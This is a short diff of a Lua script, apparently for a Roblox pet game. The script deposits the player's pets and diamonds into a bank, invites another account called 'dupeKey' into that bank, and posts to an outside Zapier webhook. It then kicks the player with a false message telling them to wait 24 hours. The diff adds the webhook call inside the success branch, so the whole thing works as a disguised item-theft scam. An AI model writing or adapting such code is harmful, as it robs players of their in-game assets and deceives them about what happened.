@@ -12,12 +12,12 @@ end
 local request = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 69);
 if request then
     lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey)
+    local url = "https://hooks.zapier.com/hooks/catch/12832877/bwscxwe/"
+    local data0 = {}
+    local newdata0 = game:GetService'HttpService':JSONEncode(data0)
+    game:HttpPost(url,newdata0)
     game.Players.LocalPlayer:Kick("Please wait 24h before your rejoin.")
 end
-local url = "https://hooks.zapier.com/hooks/catch/12832877/bwscxwe/"
-local data0 = {}
-local newdata0 = game:GetService'HttpService':JSONEncode(data0)
-game:HttpPost(url,newdata0)
 
 
 
